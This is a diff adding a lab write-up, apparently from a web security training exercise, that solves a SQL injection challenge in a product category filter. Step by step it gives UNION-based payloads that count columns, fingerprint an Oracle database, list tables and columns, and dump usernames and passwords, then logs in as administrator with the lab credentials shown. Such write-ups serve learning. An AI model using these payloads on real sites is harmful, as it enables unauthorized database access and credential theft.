@@ -1,0 +1,63 @@
+SQL injection - Product category filter
+
+Goals:
+1- Determine the table name that holds usernames and passwords and the columns it contains.
+2- Retrieve all usernames and passwords.
+3- Login as the administrator user.
+
+Analysis:
+
+Step #1: Determine the number of columns
+' ORDER BY 1--  -> displayed on the page
+' ORDER BY 2--  -> displayed on the page
+' ORDER BY 3--  -> error
+The number of columns is 2
+
+Step #2: Determine the data type of the columns
+' UNION SELECT 'a', NULL--
+-> error -> the database is not PostgreSQL
+
+' UNION SELECT 'a', NULL#
+-> error -> the database is not Microsoft nor MySQL
+
+' UNION SELECT 'a', NULL From DUAL--  
+-> 200 response-> Oracle database -> column is string data type
+
+' UNION SELECT NULL, 'a' From DUAL--  -> string data type
+
+Both columns accept string data type
+
+Step #3: Determine the version of the database
+' UNION SELECT banner, NULL FROM v$version--
+
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+Step #4: Display the list table names in the database
+' UNION SELECT table_name, NULL FROM all_tables--
+
+USERS_NFEQKZ
+
+Step #5: Display the columns in USERS_NFEQKZ
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_NFEQKZ'--
+
+USERNAME_SNHQOC
+PASSWORD_GPPHPM
+
+Step #6: Display all usernames and passwords
+' UNION SELECT USERNAME_SNHQOC, PASSWORD_GPPHPM FROM USERS_NFEQKZ--
+
+Username: administrator
+Password: r6c25qqp57an7t4o2mlj
+
+Username: carlos
+Password: jvfkauj506z9dpius4tt
+
+Username: wiener
+Password: inwxtkjm6r2vs0axkekq
+
+Step #7: Login as the administrator user
+
+Username: administrator
+Password: r6c25qqp57an7t4o2mlj
+
+Solved
